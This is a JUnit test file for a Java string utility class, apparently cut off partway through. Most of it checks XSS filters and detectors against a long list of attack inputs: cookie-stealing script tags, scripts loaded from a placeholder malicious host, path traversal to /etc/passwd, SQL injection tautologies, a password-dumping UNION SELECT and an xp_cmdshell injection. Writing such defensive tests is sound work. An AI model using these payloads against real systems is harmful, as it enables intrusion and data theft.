package csiebug.test.util;

import static org.junit.Assert.*;

import java.util.ArrayList;
import java.util.List;

import org.junit.Test;

import csiebug.util.EmailFormatException;
import csiebug.util.StringParseException;
import csiebug.util.StringUtility;

public class StringUtilityTest {

	@Test
	public void testAddZeroIntInt() {
		int code = 98;
		int length = 3;
		
		assertEquals("098", StringUtility.addZero(code, length));
	}

	@Test
	public void testAddZeroStringInt() {
		String code = "98";
		int length = 3;
		
		assertEquals("098", StringUtility.addZero(code, length));
	}

	@Test
	public void testDelZero() {
		String code = "098";
		
		assertEquals("98", StringUtility.delZero(code));
	}
	
	@Test
	public void testAddZeroToTailIntInt() {
		int code = 98;
		int length = 3;
		
		assertEquals("980", StringUtility.addZeroToTail(code, length));
	}

	@Test
	public void testAddZeroToTailStringInt() {
		String code = "98";
		int length = 3;
		
		assertEquals("980", StringUtility.addZeroToTail(code, length));
	}

	@Test
	public void testDelZeroToTail() {
		String code = "980";
		
		assertEquals("98", StringUtility.delZeroToTail(code));
	}

	@Test
	public void testCheckHtmlStyle() {
		String styleString = "color:white;display:none;bg-color:black;width=800;height=600";
		String name = "display";
		String value = "none";
		assertEquals(true, StringUtility.checkHtmlStyle(styleString, name, value));
		
		styleString = "color:white;display:block;bg-color:black;width=800;height=600";
		name = "display";
		value = "none";
		assertEquals(false, StringUtility.checkHtmlStyle(styleString, name, value));
		
		styleString = "color:white;bg-color:black;width=800;height=600";
		name = "display";
		value = "none";
		assertEquals(false, StringUtility.checkHtmlStyle(styleString, name, value));
	}
	
	@Test
	public void testIsContainJavaScriptFunction() {
		String scriptString = "test();checkDataType();";
		
		assertEquals(true, StringUtility.isContainJavaScriptFunction(scriptString, "checkDataType"));
	}

	@Test
	public void testLtrim() {
		String value = "            	\t hello world";
		
		assertEquals("hello world", StringUtility.ltrim(value));
	}
	
	@Test
	public void testGetStartsWithSpaceCount() {
		String value = "            	\t hello world";
		
		assertEquals(21, StringUtility.getStartsWithSpaceCount(value, 4));
	}

	@Test
	public void testGetExtensionFileName() {
		String fileName = "test.doc";
		
		assertEquals("doc", StringUtility.getExtensionFileName(fileName));
	}
	
	@Test
	public void testCamelNamingtoUderlineNaming() {
		String value = "abcDefGhi";
		
		assertEquals("abc_def_ghi", StringUtility.camelNamingtoUderlineNaming(value));
	}
	
	@Test
	public void testUderlineNamingtoCamelNaming() {
		String value = "abc_def_ghi";
		
		assertEquals("abcDefGhi", StringUtility.uderlineNamingtoCamelNaming(value));
	}
	
	private void testXSSString(String xssString) {
		assertEquals(false, StringUtility.cleanXSSPattern(xssString).equals(xssString));
	}
	
	private void testValidString(String xssString) {
		assertEquals(true, StringUtility.cleanXSSPattern(xssString).equals(xssString));
	}
	
	@Test
	public void testCleanXSSPattern() {
		//測試環境變數
		testValidString("jdbc/csiebug");
		testValidString("http://localhost:8080/csiebug-2.0/index");
		testValidString("csiebug-2.0");
		testValidString("zh_TW");
		testValidString("23");
		testValidString("3");
		testValidString("1048576000");
		testValidString("30");
		
		//測試一些合法輸入
		
		//測試xss測試語法大全
		testXSSString("='><script>alert(document.cookie)</script>");
		testXSSString("<script>alert(document.cookie)</script>");
		testXSSString("<script>alert(vulnerable)</script>");
		testXSSString("%3Cscript%3Ealert('XSS')%3C/script%3E");
		testXSSString("<script>alert('XSS')</script>");
		testXSSString("<img src=\"javascript:alert('XSS')\">");
		testXSSString("%0a%0a<script>alert(\"Vulnerable\")</script>.jsp");
		testXSSString("%22%3cscript%3ealert(%22xss%22)%3c/script%3e");
		testXSSString("%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd");
		testXSSString("%2E%2E/%2E%2E/%2E%2E/%2E%2E/%2E%2E/windows/win.ini");
		testXSSString("%3c/a%3e%3cscript%3ealert(%22xss%22)%3c/script%3e");
		testXSSString("%3c/title%3e%3cscript%3ealert(%22xss%22)%3c/script%3e");
		testXSSString("%3cscript%3ealert(%22xss%22)%3c/script%3e/index.html");
		testXSSString("<script>alert('Vulnerable');</script>");
		testXSSString("<script>alert('Vulnerable')</script>");
		testXSSString("?sql_debug=1");
		testXSSString("a%5c.aspx");
		testXSSString("a.jsp/<script>alert('Vulnerable')</script>");
		testXSSString("a?<script>alert('Vulnerable')</script>");
		testXSSString("\"><script>alert('Vulnerable')</script>");
		testXSSString("';exec%20master..xp_cmdshell%20'dir%20 c:%20>%20c:\\inetpub\\wwwroot\\?.txt'--&&");
		testXSSString("%22%3E%3Cscript%3Ealert(document.cookie)%3C/script%3E");
		testXSSString("%3Cscript%3Ealert(document. domain);%3C/script%3E&");
		testXSSString("%3Cscript%3Ealert(document.domain);%3C/script%3E&SESSION_ID={SESSION_ID}&SESSION_ID= 1%20union%20all%20select%20pass,0,0,0,0%20from%20customers%20where%20fname=");
		testXSSString("../../../../../../../../etc/passwd");
		testXSSString("..\\..\\..\\..\\..\\..\\..\\..\\windows\\system.ini");
		testXSSString("\\..\\..\\..\\..\\..\\..\\..\\..\\windows\\system.ini");
		testXSSString("'';!--\"<XSS>=&{()}");
		testXSSString("<IMG SRC=\"javascript:alert('XSS');\">");
		testXSSString("<IMG SRC=javascript:alert('XSS')>");
		testXSSString("<IMG SRC=JaVaScRiPt:alert('XSS')>");
		testXSSString("<IMG SRC=JaVaScRiPt:alert(\"XSS\")>");
		testXSSString("<IMG SRC=javascript:alert('XSS')>");
		testXSSString("<IMG SRC=javascript:alert('XSS')>");
		testXSSString("<IMG SRC=&#x6A&#x61&#x76&#x61&#x73&#x63&#x72&#x69&#x70&#x74&#x3A&#x61&#x6C&#x65&#x72&#x74&#x28&#x27&#x58&#x53&#x53&#x27&#x29>");
		testXSSString("<IMG SRC=\"javascript:alert('XSS');\">");
		testXSSString("\"<IMG SRC=java\0script:alert(\\\"XSS\\\")>\";' > out");
		testXSSString("<IMG SRC=\" javascript:alert('XSS');\">");
		testXSSString("<SCRIPT>a=/XSS/alert(a.source)</SCRIPT>");
		testXSSString("<BODY BACKGROUND=\"javascript:alert('XSS')\">");
		testXSSString("<BODY ONLOAD=alert('XSS')>");
		testXSSString("<IMG DYNSRC=\"javascript:alert('XSS')\">");
		testXSSString("<IMG LOWSRC=\"javascript:alert('XSS')\">");
		testXSSString("<BGSOUND SRC=\"javascript:alert('XSS');\">");
		testXSSString("<br size=\"&{alert('XSS')}\">");
		testXSSString("<LAYER SRC=\"http://惡意網址/a.js\"></layer>");
		testXSSString("<LINK REL=\"stylesheet\" HREF=\"javascript:alert('XSS');\">");
		testXSSString("<IMG SRC='vbscript:msgbox(\"XSS\")'>");
		testXSSString("<IMG SRC=\"mocha:[code]\">");
		testXSSString("<IMG SRC=\"livescript:[code]\">");
		testXSSString("<META HTTP-EQUIV=\"refresh\" CONTENT=\"0;url=javascript:alert('XSS');\">");
		testXSSString("<IFRAME SRC=javascript:alert('XSS')></IFRAME>");
		testXSSString("<FRAMESET><FRAME SRC=javascript:alert('XSS')></FRAME></FRAMESET>");
		testXSSString("<TABLE BACKGROUND=\"javascript:alert('XSS')\">");
		testXSSString("<DIV STYLE=\"background-image: url(javascript:alert('XSS'))\">");
		testXSSString("<DIV STYLE=\"behaviour: url('http://惡意網址/exploit.html');\">");
		testXSSString("<DIV STYLE=\"width: expression(alert('XSS'));\">");
		testXSSString("<STYLE>@im\\port'\\ja\\vasc\\ript:alert(\"XSS\")';</STYLE>");
		testXSSString("<IMG STYLE='xss:expre\\ssion(alert(\"XSS\"))'>");
		testXSSString("<STYLE TYPE=\"text/javascript\">alert('XSS');</STYLE>");
		testXSSString("<STYLE TYPE=\"text/css\">.XSS{background-image:url(\"javascript:alert('XSS')\");}</STYLE><A CLASS=XSS></A>");
		testXSSString("<STYLE type=\"text/css\">BODY{background:url(\"javascript:alert('XSS')\")}</STYLE>");
		testXSSString("<BASE HREF=\"javascript:alert('XSS');//\">");
		testXSSString("getURL(\"javascript:alert('XSS')\")");
		testXSSString("a=\"get\";b=\"URL\";c=\"javascript:\";d=\"alert('XSS');\";eval(a+b+c+d);");
		testXSSString("<XML SRC=\"javascript:alert('XSS');\">");
		testXSSString("\"> <BODY ONLOAD=\"a();\"><SCRIPT>function a(){alert('XSS');}</SCRIPT><\"");
		testXSSString("<SCRIPT SRC=\"http://惡意網址/xss.jpg\"></SCRIPT>");
		testXSSString("<IMG SRC=\"javascript:alert('XSS')\"");
		testXSSString("<!--#exec cmd=\"/bin/echo '<SCRIPT SRC'\"--><!--#exec cmd=\"/bin/echo '=http://惡意網址/a.js></SCRIPT>'\"-->");
		testXSSString("<IMG SRC=\"http://惡意網址/somecommand.php?somevariables=maliciouscode\">");
		testXSSString("<SCRIPT a=\">\" SRC=\"http://惡意網址/a.js\"></SCRIPT>");
		testXSSString("<SCRIPT =\">\" SRC=\"http://惡意網址/a.js\"></SCRIPT>");
		testXSSString("<SCRIPT a=\">\" '' SRC=\"http://惡意網址/a.js\"></SCRIPT>");
		testXSSString("<SCRIPT \"a='>'\" SRC=\"http://惡意網址/a.js\"></SCRIPT>");
		testXSSString("<SCRIPT>document.write(\"<SCRI\");</SCRIPT>PT SRC=\"http://惡意網址/a.js\"></SCRIPT>");
		testXSSString("<A HREF=http://惡意網址/>link</A>");
		testXSSString("admin'--");
		testXSSString("' or 0=0 --");
		testXSSString("\" or 0=0 --");
		testXSSString("or 0=0 --");
		testXSSString("' or 0=0 #");
		testXSSString("\" or 0=0 #");
		testXSSString("or 0=0 #");
		testXSSString("' or 'x'='x");
		testXSSString("\" or \"x\"=\"x");
		testXSSString("') or ('x'='x");
		testXSSString("' or 1=1--");
		testXSSString("\" or 1=1--");
		testXSSString("or 1=1--");
		testXSSString("' or a=a--");
		testXSSString("\" or \"a\"=\"a");
		testXSSString("') or ('a'='a");
		testXSSString("\") or (\"a\"=\"a");
		testXSSString("hi\" or \"a\"=\"a");
		testXSSString("hi\" or 1=1 --");
		testXSSString("hi' or 1=1 --");
		testXSSString("hi' or 'a'='a");
		testXSSString("hi') or ('a'='a");
		testXSSString("hi\") or (\"a\"=\"aXSS測試語法><script>alert(document.cookie)</script>");
	}
	
	@Test
	public void testIsXSSPattern() {
		//測試環境變數
		assertEquals(false, StringUtility.isXSSPattern("jdbc/csiebug"));
		assertEquals(false, StringUtility.isXSSPattern("http://localhost:8080/csiebug-2.0/index"));
		assertEquals(false, StringUtility.isXSSPattern("csiebug-2.0"));
		assertEquals(false, StringUtility.isXSSPattern("zh_TW"));
		assertEquals(false, StringUtility.isXSSPattern("23"));
		assertEquals(false, StringUtility.isXSSPattern("3"));
		assertEquals(false, StringUtility.isXSSPattern("1048576000"));
		assertEquals(false, StringUtility.isXSSPattern("30"));
		
		//測試一些合法輸入
		
		//測試xss測試語法大全
		assertEquals(true, StringUtility.isXSSPattern("../../../../../../../../etc/passwd"));
		assertEquals(true, StringUtility.isXSSPattern("..\\..\\..\\..\\..\\..\\..\\..\\windows\\system.ini"));
		assertEquals(true, StringUtility.isXSSPattern("\\..\\..\\..\\..\\..\\..\\..\\..\\windows\\system.ini"));
		assertEquals(true, StringUtility.isXSSPattern("='><script>alert(document.cookie)</script>"));
		assertEquals(true, StringUtility.isXSSPattern("<script>alert(document.cookie)</script>"));
		assertEquals(true, StringUtility.isXSSPattern("<script>alert(vulnerable)</script>"));
		assertEquals(true, StringUtility.isXSSPattern("%3Cscript%3Ealert('XSS')%3C/script%3E"));
		assertEquals(true, StringUtility.isXSSPattern("<script>alert('XSS')</script>"));
		assertEquals(true, StringUtility.isXSSPattern("<img src=\"javascript:alert('XSS')\">"));
		assertEquals(true, StringUtility.isXSSPattern("%0a%0a<script>alert(\"Vulnerable\")</script>.jsp"));
		assertEquals(true, StringUtility.isXSSPattern("%22%3cscript%3ealert(%22xss%22)%3c/script%3e"));
		assertEquals(true, StringUtility.isXSSPattern("%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd"));
		assertEquals(true, StringUtility.isXSSPattern("%2E%2E/%2E%2E/%2E%2E/%2E%2E/%2E%2E/windows/win.ini"));
		assertEquals(true, StringUtility.isXSSPattern("%3c/a%3e%3cscript%3ealert(%22xss%22)%3c/script%3e"));
		assertEquals(true, StringUtility.isXSSPattern("%3c/title%3e%3cscript%3ealert(%22xss%22)%3c/script%3e"));
		assertEquals(true, StringUtility.isXSSPattern("%3cscript%3ealert(%22xss%22)%3c/script%3e/index.html"));
		assertEquals(true, StringUtility.isXSSPattern("<script>alert('Vulnerable');</script>"));
		assertEquals(true, StringUtility.isXSSPattern("<script>alert('Vulnerable')</script>"));
		assertEquals(true, StringUtility.isXSSPattern("?sql_debug=1"));
		assertEquals(true, StringUtility.isXSSPattern("a%5c.aspx"));
		assertEquals(true, StringUtility.isXSSPattern("a.jsp/<script>alert('Vulnerable')</script>"));
		assertEquals(true, StringUtility.isXSSPattern("a?<script>alert('Vulnerable')</script>"));
		assertEquals(true, StringUtility.isXSSPattern("\"><script>alert('Vulnerable')</script>"));
		assertEquals(true, StringUtility.isXSSPattern("';exec%20master..xp_cmdshell%20'dir%20 c:%20>%20c:\\inetpub\\wwwroot\\?.txt'--&&"));
		assertEquals(true, StringUtility.isXSSPattern("%22%3E%3Cscript%3Ealert(document.cookie)%3C/script%3E"));
		assertEquals(true, StringUtility.isXSSPattern("%3Cscript%3Ealert(document. domain);%3C/script%3E&"));
		assertEquals(true, StringUtility.isXSSPattern("%3Cscript%3Ealert(document.domain);%3C/script%3E&SESSION_ID={SESSION_ID}&SESSION_ID= 1%20union%20all%20select%20pass,0,0,0,0%20from%20customers%20where%20fname="));
		assertEquals(true, StringUtility.isXSSPattern("'';!--\"<XSS>=&{()}"));
		assertEquals(true, StringUtility.isXSSPattern("<IMG SRC=\"javascript:alert('XSS');\">"));
		assertEquals(true, StringUtility.isXSSPattern("<IMG SRC=javascript:alert('XSS')>"));
		assertEquals(true, StringUtility.isXSSPattern("<IMG SRC=JaVaScRiPt:alert('XSS')>"));
		assertEquals(true, StringUtility.isXSSPattern("<IMG SRC=JaVaScRiPt:alert(\"XSS\")>"));
		assertEquals(true, StringUtility.isXSSPattern("<IMG SRC=javascript:alert('XSS')>"));
		assertEquals(true, StringUtility.isXSSPattern("<IMG SRC=javascript:alert('XSS')>"));
		assertEquals(true, StringUtility.isXSSPattern("<IMG SRC=&#x6A&#x61&#x76&#x61&#x73&#x63&#x72&#x69&#x70&#x74&#x3A&#x61&#x6C&#x65&#x72&#x74&#x28&#x27&#x58&#x53&#x53&#x27&#x29>"));
		assertEquals(true, StringUtility.isXSSPattern("<IMG SRC=\"javascript:alert('XSS');\">"));
		assertEquals(true, StringUtility.isXSSPattern("\"<IMG SRC=java\0script:alert(\\\"XSS\\\")>\";' > out"));
		assertEquals(true, StringUtility.isXSSPattern("<IMG SRC=\" javascript:alert('XSS');\">"));
		assertEquals(true, StringUtility.isXSSPattern("<SCRIPT>a=/XSS/alert(a.source)</SCRIPT>"));
		assertEquals(true, StringUtility.isXSSPattern("<BODY BACKGROUND=\"javascript:alert('XSS')\">"));
		assertEquals(true, StringUtility.isXSSPattern("<BODY ONLOAD=alert('XSS')>"));
		assertEquals(true, StringUtility.isXSSPattern("<IMG DYNSRC=\"javascript:alert('XSS')\">"));
		assertEquals(true, StringUtility.isXSSPattern("<IMG LOWSRC=\"javascript:alert('XSS')\">"));
		assertEquals(true, StringUtility.isXSSPattern("<BGSOUND SRC=\"javascript:alert('XSS');\">"));
		assertEquals(true, StringUtility.isXSSPattern("<br size=\"&{alert('XSS')}\">"));
		assertEquals(true, StringUtility.isXSSPattern("<LAYER SRC=\"http://惡意網址/a.js\"></layer>"));
		assertEquals(true, StringUtility.isXSSPattern("<LINK REL=\"stylesheet\" HREF=\"javascript:alert('XSS');\">"));
		assertEquals(true, StringUtility.isXSSPattern("<IMG SRC='vbscript:msgbox(\"XSS\")'>"));
		assertEquals(true, StringUtility.isXSSPattern("<IMG SRC=\"mocha:[code]\">"));
		assertEquals(true, StringUtility.isXSSPattern("<IMG SRC=\"livescript:[code]\">"));
		assertEquals(true, StringUtility.isXSSPattern("<META HTTP-EQUIV=\"refresh\" CONTENT=\"0;url=javascript:alert('XSS');\">"));
		assertEquals(true, StringUtility.isXSSPattern("<IFRAME SRC=javascript:alert('XSS')></IFRAME>"));
		assertEquals(true, StringUtility.isXSSPattern("<FRAMESET><FRAME SRC=javascript:alert('XSS')></FRAME></FRAMESET>"));
		assertEquals(true, StringUtility.isXSSPattern("<TABLE BACKGROUND=\"javascript:alert('XSS')\">"));
		assertEquals(true, StringUtility.isXSSPattern("<DIV STYLE=\"background-image: url(javascript:alert('XSS'))\">"));
		assertEquals(true, StringUtility.isXSSPattern("<DIV STYLE=\"behaviour: url('http://惡意網址/exploit.html');\">"));
		assertEquals(true, StringUtility.isXSSPattern("<DIV STYLE=\"width: expression(alert('XSS'));\">"));
		assertEquals(true, StringUtility.isXSSPattern("<STYLE>@im\\port'\\ja\\vasc\\ript:alert(\"XSS\")';</STYLE>"));
		assertEquals(true, StringUtility.isXSSPattern("<IMG STYLE='xss:expre\\ssion(alert(\"XSS\"))'>"));
		assertEquals(true, StringUtility.isXSSPattern("<STYLE TYPE=\"text/javascript\">alert('XSS');</STYLE>"));
		assertEquals(true, StringUtility.isXSSPattern("<STYLE TYPE=\"text/css\">.XSS{background-image:url(\"javascript:alert('XSS')\");}</STYLE><A CLASS=XSS></A>"));
		assertEquals(true, StringUtility.isXSSPattern("<STYLE type=\"text/css\">BODY{background:url(\"javascript:alert('XSS')\")}</STYLE>"));
		assertEquals(true, StringUtility.isXSSPattern("<BASE HREF=\"javascript:alert('XSS');//\">"));
		assertEquals(true, StringUtility.isXSSPattern("getURL(\"javascript:alert('XSS')\")"));
		assertEquals(true, StringUtility.isXSSPattern("a=\"get\";b=\"URL\";c=\"javascript:\";d=\"alert('XSS');\";eval(a+b+c+d);"));
		assertEquals(true, StringUtility.isXSSPattern("<XML SRC=\"javascript:alert('XSS');\">"));
		assertEquals(true, StringUtility.isXSSPattern("\"> <BODY ONLOAD=\"a();\"><SCRIPT>function a(){alert('XSS');}</SCRIPT><\""));
		assertEquals(true, StringUtility.isXSSPattern("<SCRIPT SRC=\"http://惡意網址/xss.jpg\"></SCRIPT>"));
		assertEquals(true, StringUtility.isXSSPattern("<IMG SRC=\"javascript:alert('XSS')\""));
		assertEquals(true, StringUtility.isXSSPattern("<!--#exec cmd=\"/bin/echo '<SCRIPT SRC'\"--><!--#exec cmd=\"/bin/echo '=http://惡意網址/a.js></SCRIPT>'\"-->"));
		assertEquals(true, StringUtility.isXSSPattern("<IMG SRC=\"http://惡意網址/somecommand.php?somevariables=maliciouscode\">"));
		assertEquals(true, StringUtility.isXSSPattern("<SCRIPT a=\">\" SRC=\"http://惡意網址/a.js\"></SCRIPT>"));
		assertEquals(true, StringUtility.isXSSPattern("<SCRIPT =\">\" SRC=\"http://惡意網址/a.js\"></SCRIPT>"));
		assertEquals(true, StringUtility.isXSSPattern("<SCRIPT a=\">\" '' SRC=\"http://惡意網址/a.js\"></SCRIPT>"));
		assertEquals(true, StringUtility.isXSSPattern("<SCRIPT \"a='>'\" SRC=\"http://惡意網址/a.js\"></SCRIPT>"));
		assertEquals(true, StringUtility.isXSSPattern("<SCRIPT>document.write(\"<SCRI\");</SCRIPT>PT SRC=\"http://惡意網址/a.js\"></SCRIPT>"));
		assertEquals(true, StringUtility.isXSSPattern("<A HREF=http://惡意網址/>link</A>"));
		assertEquals(true, StringUtility.isXSSPattern("admin'--"));
		assertEquals(true, StringUtility.isXSSPattern("' or 0=0 --"));
		assertEquals(true, StringUtility.isXSSPattern("\" or 0=0 --"));
		assertEquals(true, StringUtility.isXSSPattern("or 0=0 --"));
		assertEquals(true, StringUtility.isXSSPattern("' or 0=0 #"));
		assertEquals(true, StringUtility.isXSSPattern("\" or 0=0 #"));
		assertEquals(true, StringUtility.isXSSPattern("or 0=0 #"));
		assertEquals(true, StringUtility.isXSSPattern("' or 'x'='x"));
		assertEquals(true, StringUtility.isXSSPattern("\" or \"x\"=\"x"));
		assertEquals(true, StringUtility.isXSSPattern("') or ('x'='x"));
		assertEquals(true, StringUtility.isXSSPattern("' or 1=1--"));
		assertEquals(true, StringUtility.isXSSPattern("\" or 1=1--"));
		assertEquals(true, StringUtility.isXSSPattern("or 1=1--"));
		assertEquals(true, StringUtility.isXSSPattern("' or a=a--"));
		assertEquals(true, StringUtility.isXSSPattern("\" or \"a\"=\"a"));
		assertEquals(true, StringUtility.isXSSPattern("') or ('a'='a"));
		assertEquals(true, StringUtility.isXSSPattern("\") or (\"a\"=\"a"));
		assertEquals(true, StringUtility.isXSSPattern("hi\" or \"a\"=\"a"));
		assertEquals(true, StringUtility.isXSSPattern("hi\" or 1=1 --"));
		assertEquals(true, StringUtility.isXSSPattern("hi' or 1=1 --"));
		assertEquals(true, StringUtility.isXSSPattern("hi' or 'a'='a"));
		assertEquals(true, StringUtility.isXSSPattern("hi') or ('a'='a"));
		assertEquals(true, StringUtility.isXSSPattern("hi\") or (\"a\"=\"aXSS測試語法><script>alert(document.cookie)</script>"));
	}
	
	@Test
	public void testIsXSSPatternWithoutHTMLTag() {
		//測試環境變數
		assertEquals(false, StringUtility.isXSSPatternWithoutHTMLTag("jdbc/csiebug"));
		assertEquals(false, StringUtility.isXSSPatternWithoutHTMLTag("http://localhost:8080/csiebug-2.0/index"));
		assertEquals(false, StringUtility.isXSSPatternWithoutHTMLTag("csiebug-2.0"));
		assertEquals(false, StringUtility.isXSSPatternWithoutHTMLTag("zh_TW"));
		assertEquals(false, StringUtility.isXSSPatternWithoutHTMLTag("23"));
		assertEquals(false, StringUtility.isXSSPatternWithoutHTMLTag("3"));
		assertEquals(false, StringUtility.isXSSPatternWithoutHTMLTag("1048576000"));
		assertEquals(false, StringUtility.isXSSPatternWithoutHTMLTag("30"));
		
		//測試一些合法輸入
		assertEquals(false, StringUtility.isXSSPatternWithoutHTMLTag("ANSWER_DESCRIPTION"));
		
		//測試xss測試語法大全
		//惡意網址攻擊(因為還是合法的HTML tag所以本函式不會抓出來)
		assertEquals(false, StringUtility.isXSSPatternWithoutHTMLTag("<IMG SRC=&#x6A&#x61&#x76&#x61&#x73&#x63&#x72&#x69&#x70&#x74&#x3A&#x61&#x6C&#x65&#x72&#x74&#x28&#x27&#x58&#x53&#x53&#x27&#x29>"));
		assertEquals(false, StringUtility.isXSSPatternWithoutHTMLTag("<LAYER SRC=\"http://惡意網址/a.js\"></layer>"));
		assertEquals(false, StringUtility.isXSSPatternWithoutHTMLTag("<IMG SRC=\"mocha:[code]\">"));
		assertEquals(false, StringUtility.isXSSPatternWithoutHTMLTag("<IMG SRC=\"http://惡意網址/somecommand.php?somevariables=maliciouscode\">"));
		assertEquals(false, StringUtility.isXSSPatternWithoutHTMLTag("<A HREF=http://惡意網址/>link</A>"));
		
		//以下不是合法的HTML tag
		assertEquals(true, StringUtility.isXSSPatternWithoutHTMLTag("../../../../../../../../etc/passwd"));
		assertEquals(true, StringUtility.isXSSPatternWithoutHTMLTag("..\\..\\..\\..\\..\\..\\..\\..\\windows\\system.ini"));
		assertEquals(true, StringUtility.isXSSPatternWithoutHTMLTag("\\..\\..\\..\\..\\..\\..\\..\\..\\windows\\system.ini"));
		assertEquals(true, StringUtility.isXSSPatternWithoutHTMLTag("='><script>alert(document.cookie)</script>"));
		assertEquals(true, StringUtility.isXSSPatternWithoutHTMLTag("<script>alert(document.cookie)</script>"));
		assertEquals(true, StringUtility.isXSSPatternWithoutHTMLTag("<script>alert(vulnerable)</script>"));
		assertEquals(true, StringUtility.isXSSPatternWithoutHTMLTag("%3Cscript%3Ealert('XSS')%3C/script%3E"));
		assertEquals(true, StringUtility.isXSSPatternWithoutHTMLTag("<script>alert('XSS')</script>"));
		assertEquals(true, StringUtility.isXSSPatternWithoutHTMLTag("<img src=\"javascript:alert('XSS')\">"));
		assertEquals(true, StringUtility.isXSSPatternWithoutHTMLTag("%0a%0a<script>alert(\"Vulnerable\")</script>.jsp"));
		assertEquals(true, StringUtility.isXSSPatternWithoutHTMLTag("%22%3cscript%3ealert(%22xss%22)%3c/script%3e"));
		assertEquals(true, StringUtility.isXSSPatternWithoutHTMLTag("%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd"));
		assertEquals(true, StringUtility.isXSSPatternWithoutHTMLTag("%2E%2E/%2E%2E/%2E%2E/%2E%2E/%2E%2E/windows/win.ini"));
		assertEquals(true, StringUtility.isXSSPatternWithoutHTMLTag("%3c/a%3e%3cscript%3ealert(%22xss%22)%3c/script%3e"));
		assertEquals(true, StringUtility.isXSSPatternWithoutHTMLTag("%3c/title%3e%3cscript%3ealert(%22xss%22)%3c/script%3e"));
		assertEquals(true, StringUtility.isXSSPatternWithoutHTMLTag("%3cscript%3ealert(%22xss%22)%3c/script%3e/index.html"));
		assertEquals(true, StringUtility.isXSSPatternWithoutHTMLTag("<script>alert('Vulnerable');</script>"));
		assertEquals(true, StringUtility.isXSSPatternWithoutHTMLTag("<script>alert('Vulnerable')</script>"));
		assertEquals(true, StringUtility.isXSSPatternWithoutHTMLTag("?sql_debug=1"));
		assertEquals(true, StringUtility.isXSSPatternWithoutHTMLTag("a%5c.aspx"));
		assertEquals(true, StringUtility.isXSSPatternWithoutHTMLTag("a.jsp/<script>alert('Vulnerable')</script>"));
		assertEquals(true, StringUtility.isXSSPatternWithoutHTMLTag("a?<script>alert('Vulnerable')</script>"));
		assertEquals(true, StringUtility.isXSSPatternWithoutHTMLTag("\"><script>alert('Vulnerable')</script>"));
		assertEquals(true, StringUtility.isXSSPatternWithoutHTMLTag("';exec%20master..xp_cmdshell%20'dir%20 c:%20>%20c:\\inetpub\\wwwroot\\?.txt'--&&"));
		assertEquals(true, StringUtility.isXSSPatternWithoutHTMLTag("%22%3E%3Cscript%3Ealert(document.cookie)%3C/script%3E"));
		assertEquals(true, StringUtility.isXSSPatternWithoutHTMLTag("%3Cscript%3Ealert(document. domain);%3C/script%3E&"));
		assertEquals(true, StringUtility.isXSSPatternWithoutHTMLTag("%3Cscript%3Ealert(document.domain);%3C/script%3E&SESSION_ID={SESSION_ID}&SESSION_ID= 1%20union%20all%20select%20pass,0,0,0,0%20from%20customers%20where%20fname="));
		assertEquals(true, StringUtility.isXSSPatternWithoutHTMLTag("'';!--\"<XSS>=&{()}"));
		assertEquals(true, StringUtility.isXSSPatternWithoutHTMLTag("<IMG SRC=\"javascript:alert('XSS');\">"));
		assertEquals(true, StringUtility.isXSSPatternWithoutHTMLTag("<IMG SRC=javascript:alert('XSS')>"));
		assertEquals(true, StringUtility.isXSSPatternWithoutHTMLTag("<IMG SRC=JaVaScRiPt:alert('XSS')>"));
		assertEquals(true, StringUtility.isXSSPatternWithoutHTMLTag("<IMG SRC=JaVaScRiPt:alert(\"XSS\")>"));
		assertEquals(true, StringUtility.isXSSPatternWithoutHTMLTag("<IMG SRC=javascript:alert('XSS')>"));
		assertEquals(true, StringUtility.isXSSPatternWithoutHTMLTag("<IMG SRC=javascript:alert('XSS')>"));
		assertEquals(true, StringUtility.isXSSPatternWithoutHTMLTag("<IMG SRC=\"javascript:alert('XSS');\">"));
		assertEquals(true, StringUtility.isXSSPatternWithoutHTMLTag("\"<IMG SRC=java\0script:alert(\\\"XSS\\\")>\";' > out"));
		assertEquals(true, StringUtility.isXSSPatternWithoutHTMLTag("<IMG SRC=\" javascript:alert('XSS');\">"));
		assertEquals(true, StringUtility.isXSSPatternWithoutHTMLTag("<SCRIPT>a=/XSS/alert(a.source)</SCRIPT>"));
		assertEquals(true, StringUtility.isXSSPatternWithoutHTMLTag("<BODY BACKGROUND=\"javascript:alert('XSS')\">"));
		assertEquals(true, StringUtility.isXSSPatternWithoutHTMLTag("<BODY ONLOAD=alert('XSS')>"));
		assertEquals(true, StringUtility.isXSSPatternWithoutHTMLTag("<IMG DYNSRC=\"javascript:alert('XSS')\">"));
		assertEquals(true, StringUtility.isXSSPatternWithoutHTMLTag("<IMG LOWSRC=\"javascript:alert('XSS')\">"));
		assertEquals(true, StringUtility.isXSSPatternWithoutHTMLTag("<BGSOUND SRC=\"javascript:alert('XSS');\">"));
		assertEquals(true, StringUtility.isXSSPatternWithoutHTMLTag("<br size=\"&{alert('XSS')}\">"));
		assertEquals(true, StringUtility.isXSSPatternWithoutHTMLTag("<LINK REL=\"stylesheet\" HREF=\"javascript:alert('XSS');\">"));
		assertEquals(true, StringUtility.isXSSPatternWithoutHTMLTag("<IMG SRC='vbscript:msgbox(\"XSS\")'>"));
		assertEquals(true, StringUtility.isXSSPatternWithoutHTMLTag("<IMG SRC=\"livescript:[code]\">"));
		assertEquals(true, StringUtility.isXSSPatternWithoutHTMLTag("<META HTTP-EQUIV=\"refresh\" CONTENT=\"0;url=javascript:alert('XSS');\">"));
		assertEquals(true, StringUtility.isXSSPatternWithoutHTMLTag("<IFRAME SRC=javascript:alert('XSS')></IFRAME>"));
		assertEquals(true, StringUtility.isXSSPatternWithoutHTMLTag("<FRAMESET><FRAME SRC=javascript:alert('XSS')></FRAME></FRAMESET>"));
		assertEquals(true, StringUtility.isXSSPatternWithoutHTMLTag("<TABLE BACKGROUND=\"javascript:alert('XSS')\">"));
		assertEquals(true, StringUtility.isXSSPatternWithoutHTMLTag("<DIV STYLE=\"background-image: url(javascript:alert('XSS'))\">"));
		assertEquals(true, StringUtility.isXSSPatternWithoutHTMLTag("<DIV STYLE=\"behaviour: url('http://惡意網址/exploit.html');\">"));
		assertEquals(true, StringUtility.isXSSPatternWithoutHTMLTag("<DIV STYLE=\"width: expression(alert('XSS'));\">"));
